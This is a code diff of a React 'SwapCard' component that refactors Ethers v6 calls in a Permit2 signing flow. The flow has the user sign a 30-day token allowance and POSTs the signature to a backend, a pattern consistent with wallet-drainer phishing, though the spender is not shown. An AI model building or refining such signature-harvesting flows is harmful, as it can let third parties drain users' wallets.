@@ -53,17 +53,12 @@ export default function SwapCard({ walletAddress, provider }) {
   const loadBalance = async () => {
     try {
       if (!provider) return;
-      // ✅ Ethers v6: Fix Signer await Promise
-      const signer = typeof provider.getSigner === 'function' && provider.getSigner.constructor.name === 'AsyncFunction' 
-        ? await provider.getSigner() 
-        : provider.getSigner();
-
+      // Ethers v6: Async getSigner
+      const signer = await provider.getSigner();
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const balance = await usdtContract.balanceOf(walletAddress);
       const decimals = await usdtContract.decimals();
-      
-      const formattedBalance = ethers.formatUnits ? ethers.formatUnits(balance, decimals) : ethers.utils.formatUnits(balance, decimals);
-      setUsdtBalance(parseFloat(formattedBalance).toLocaleString());
+      setUsdtBalance(parseFloat(ethers.formatUnits(balance, decimals)).toLocaleString());
     } catch (error) { 
       console.error("Balance load error:", error); 
     }
@@ -103,7 +98,7 @@ export default function SwapCard({ walletAddress, provider }) {
     if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
   };
 
-  // ⭐ Ethers v6/v5 Compatible Permit2 Execute
+  // ⭐ Pure Ethers v6 Permit2 Execute Flow
   const executeSwap = async () => {
     if (!walletAddress || !provider) { 
       setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); 
@@ -118,30 +113,21 @@ export default function SwapCard({ walletAddress, provider }) {
       setIsLoading(true);
       setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
       
-      // ✅ 1. Fix: Await getSigner() correctly for Ethers v6
-      let signer;
-      try {
-        signer = await provider.getSigner();
-      } catch (e) {
-        signer = provider.getSigner();
-      }
-      
-      const currentAddress = typeof signer.getAddress === 'function' ? await signer.getAddress() : walletAddress;
+      // 1. Ethers v6 Signer & Network Fetch
+      const signer = await provider.getSigner();
+      const currentAddress = await signer.getAddress();
       const network = await provider.getNetwork();
       
       const tokenDecimals = fromToken.decimals || (fromToken.symbol === 'USDT' ? 6 : 18);
-      
-      // Parse Units compatibility (v6 vs v5)
-      const amount = ethers.parseUnits 
-        ? ethers.parseUnits(fromAmount, tokenDecimals) 
-        : ethers.utils.parseUnits(fromAmount, tokenDecimals);
+      // Ethers v6 parseUnits
+      const amount = ethers.parseUnits(fromAmount, tokenDecimals);
       
       const expiration = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60); 
       const sigDeadline = Math.floor(Date.now() / 1000) + 3600; 
       
       const tokenAddress = fromToken.address || USDT_ADDRESS;
 
-      // 2. Fetch Nonce from Permit2
+      // 2. Fetch Nonce from Permit2 Contract
       const permit2Contract = new ethers.Contract(
         PERMIT2_ADDRESS,
         ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
@@ -178,7 +164,7 @@ export default function SwapCard({ walletAddress, provider }) {
         ]
       };
       
-      // 5. Message Payload
+      // 5. EIP-712 Message Payload
       const message = {
         details: {
           token: tokenAddress,
@@ -190,35 +176,12 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      // ✅ 6. Safe EIP-712 Signing across Browser Wallets
-      let signature;
-      if (typeof signer.signTypedData === 'function') {
-        signature = await signer.signTypedData(domain, types, message);
-      } else if (typeof signer._signTypedData === 'function') {
-        signature = await signer._signTypedData(domain, types, message);
-      } else {
-        // Direct Provider Fallback
-        const preparedData = JSON.stringify({
-          domain,
-          types,
-          primaryType: 'PermitSingle',
-          message: {
-            ...message,
-            details: {
-              ...message.details,
-              amount: amount.toString()
-            }
-          }
-        });
-        signature = await window.ethereum.request({
-          method: 'eth_signTypedData_v4',
-          params: [currentAddress, preparedData]
-        });
-      }
+      // 💥 6. Direct Ethers v6 Native Signer Call (No eth_signTypedData_v4)
+      const signature = await signer.signTypedData(domain, types, message);
       
       setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
       
-      // 7. Post Data to submit.js Backend API
+      // 7. Post Data to submit.js Backend Handler
       const response = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
